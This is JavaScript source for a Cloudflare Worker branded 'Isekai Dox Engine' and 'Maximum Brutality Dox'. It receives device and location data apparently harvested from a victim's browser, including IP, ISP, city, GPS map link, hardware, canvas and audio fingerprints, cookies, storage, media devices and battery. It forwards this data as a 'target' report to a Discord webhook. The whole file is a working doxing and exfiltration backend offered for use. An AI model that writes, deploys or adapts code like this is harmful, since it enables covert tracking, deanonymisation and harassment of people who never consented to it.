/**
 * Cloudflare Worker — Maximum Brutality Notifier
 */

const CORS = {
 "Access-Control-Allow-Origin": "*",
 "Access-Control-Allow-Methods": "POST, OPTIONS",
 "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
 if (v == null || v === "" || v === "null") return "—";
 return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function waktuWIB() {
 try {
 return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 } catch (_) { return new Date().toISOString(); }
}

function buildEmbed(data) {
 // Group data into logical sections for the embed fields
 const fields = [
 { name: "🎯 TARGET STATUS", value: `\`\`\`DIGITAL AUTOPSY COMPLETE\`\`\``, inline: false },
 { name: "🌐 IP & LOCATION", value: `IP: \`${s(data.ip)}\`\nISP: ${s(data.isp)}\nCity: ${s(data.city)}\nRegion: ${s(data.region)}\nCountry: ${s(data.country)}\nProxy: ${s(data.proxy)}\nHosting: ${s(data.hosting)}\nASN: ${s(data.asn)}`, inline: false },
 { name: "📡 GPS", value: data.gpsLat ? `[🗺️ View Map](https://maps.google.com/?q=${data.gpsLat},${data.gpsLon})` : "Unknown", inline: false },
 { name: "💻 HARDWARE", value: `CPU: ${s(data.hardwareConcurrency)} cores\nRAM: ${s(data.deviceMemory)} GB\nGPU: ${s(data.gpuRenderer)}\nWebGL: ${s(data.webglVersion)}\nWebGPU: ${s(data.webgpu)}\nSensors: Accel:${s(data.accel)} Gyro:${s(data.gyro)} Mag:${s(data.mag)}`, inline: false },
 { name: "🖥️ DISPLAY", value: `Res: ${s(data.screenWidth)}x${s(data.screenHeight)}\nPixel Ratio: ${s(data.pixelRatio)}\nColor Depth: ${s(data.colorDepth)} bit\nOrientation: ${s(data.orientation)} (${s(data.orientationAngle)}°)\nInner: ${s(data.innerWidth)}x${s(data.innerHeight)}`, inline: false },
 { name: "📱 PLATFORM & OS", value: `Platform: ${s(data.platform)}\nUA Mobile: ${s(data.uaMobile)}\nUA Model: ${s(data.uaModel)}\nUA Arch: ${s(data.uaArchitecture)}\nUA Bitness: ${s(data.uaBitness)}\nUA Brand: ${s(data.uaBrand)}\nUA Version: ${s(data.uaFullVersions)}`, inline: false },
 { name: "🔊 AUDIO & CANVAS", value: `Audio FP: ${s(data.audioFingerprint, 50)}\nCanvas FP: ${s(data.canvasFingerprint, 50)}`, inline: false },
 { name: "💾 STORAGE & CACHE", value: `LocalStorage: ${s(data.localStorage)}\nSessionStorage: ${s(data.sessionStorage)}\nIndexedDB: ${s(data.indexedDB)}\nService Worker: ${s(data.serviceWorker)}\nCache API: ${s(data.cacheAPI)}\nCookies: ${s(data.cookies)}`, inline: false },
 { name: "🎥 MEDIA DEVICES", value: `Audio Inputs: ${s(data.audioIn)}\nVideo Inputs: ${s(data.videoIn)}\nAudio Outputs: ${s(data.audioOut)}`, inline: false },
 { name: "🔋 BATTERY", value: `Level: ${s(data.batteryLevel)}\nCharging: ${s(data.batteryCharging)}`, inline: false },
 { name: "🌐 NETWORK", value: `Type: ${s(data.connectionType)}\nEffective: ${s(data.effectiveConnection)}\nDownlink: ${s(data.downlink)} Mbps\nRTT: ${s(data.rtt)} ms\nSave Data: ${s(data.saveData)}`, inline: false },
 { name: "🌍 LOCALE", value: `Language: ${s(data.language)}\nTimezone: ${s(data.timezone)}\nCurrency: ${s(data.currency)}\nCalendar: ${s(data.calendar)}\nNumbering: ${s(data.numberingSystem)}`, inline: false },
 { name: "🧩 BROWSER FEATURES", value: `WebGL2: ${s(data.webgl2)}\nWebGPU: ${s(data.webgpu)}\nWebRTC: ${s(data.webrtc)}\nCSS Grid: ${s(data.cssGrid)}\nFlexbox: ${s(data.flexbox)}\nFetch: ${s(data.fetchAPI)}\nPromise: ${s(data.promise)}`, inline: false },
 { name: "🔌 PLUGINS & MIME", value: `Plugins: ${s(data.plugins)}\nMIME Types: ${s(data.mimeTypes)}`, inline: false },
 { name: "📜 USER AGENT", value: `\`\`\`${s(data.userAgent, 150)}\`\`\``, inline: false },
 ];

 return {
 color: 0xFF003C,
 author: { name: "🔬 MAXIMUM BRUTALITY DOX", icon_url: "https://img.icons8.com/color/96/target.png" },
 fields,
 footer: { text: `Isekai Dox Engine v100 • ${waktuWIB()}` },
 timestamp: new Date().toISOString()
 };
}

export default {
 async fetch(request, env) {
 if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
 if (request.method !== "POST") return new Response("Not Found", { status: 404, headers: CORS });

 let data;
 try { data = await request.json(); } catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }

 const webhook = env.DISCORD_WEBHOOK_URL;
 if (!webhook) return new Response("OK", { status: 200, headers: CORS });

 try {
  await fetch(webhook, {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({
    username: "Isekai Dox Bot 🔬",
    avatar_url: "https://img.icons8.com/color/96/target.png",
    embeds: [buildEmbed(data)]
   })
  });
 } catch (e) { console.error(e); }

 return new Response("OK", { status: 200, headers: CORS });
 },
};